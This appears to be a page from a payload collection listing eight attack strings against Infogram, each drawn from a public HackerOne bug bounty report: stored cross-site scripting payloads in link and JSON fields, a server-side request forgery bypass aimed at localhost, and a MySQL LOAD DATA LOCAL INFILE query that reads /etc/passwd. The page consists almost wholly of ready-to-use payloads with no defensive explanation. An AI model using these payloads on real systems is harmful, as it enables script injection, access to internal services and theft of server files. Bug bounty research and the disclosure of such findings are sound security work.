# Infogram

8 payloads.

### `bf4bd810`

```
javascripT://https://target.com%0aalert(1);//https://target.com
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `3e091f60`

```
//https://target.com
alert(1);
//https://target.com
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `a2acbd2f`

```
document.domain
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `a401c176`

```
javascript:alert
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `afc1293a`

```
javascripT://
```

— [Stored XSS in the Custom Logo link (non-Basic plan required)](https://hackerone.com/reports/282209) · Infogram · [sp1d3rs](https://hackerone.com/sp1d3rs)

### `5291f33a`

```
[{\"type\":\"h1\",\"text\":\"asd>\\\"'<img src=a onerror=alert(document.domain)>\"}]
```

**Parameter:** `content`
— [Stored XSS in content when Graph is created via API](https://hackerone.com/reports/287562) · Infogram · [krankopwnz](https://hackerone.com/krankopwnz)

### `d67955dc`

```
https://target.com/api/web_resource/url?q=http://[0:0:0:0:0:ffff:127.0.0.1
```

**Parameter:** `q`
— [Bypass for blind SSRF #281950 and #287496](https://hackerone.com/reports/642675) · Infogram · [7001](https://hackerone.com/7001)

### `6da88c04`

```
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE asd.asd
FIELDS TERMINATED BY "\n"
```

**Parameter:** `sql_query`
— [LFI through the MySQL connection](https://hackerone.com/reports/719875) · Infogram · [muon4](https://hackerone.com/muon4)
